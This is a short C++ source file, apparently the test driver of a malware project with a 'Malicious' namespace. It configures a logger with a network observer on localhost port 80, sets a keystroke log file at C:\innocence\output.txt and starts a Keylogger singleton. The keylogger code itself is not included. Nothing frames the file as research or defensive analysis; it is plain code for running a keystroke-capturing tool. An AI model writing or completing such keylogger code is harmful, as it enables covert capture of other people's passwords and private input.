#include <cstdlib>
#include <iostream>
using namespace std;

#include <common/Logger.hpp>
#include <malicious/Keylogger.hpp>
#include <system/Process.hpp>
#include <system/ProcessManager.hpp>
using namespace System;
using namespace Malicious;

int main()
{
    FUNC_LOG(__FUNCTION__);
	LOG.setHeader("TEST KEYHOOKER");
    LOG.addObserver(new Common::LoggingMessage);
    LOG.addObserver(new Common::LoggingNetwork("127.0.0.1", 80));
    Keylogger::instance().setKeylog("C:\\innocence\\output.txt");
    Keylogger::instance().start();
	system("pause");
	return EXIT_SUCCESS;
}
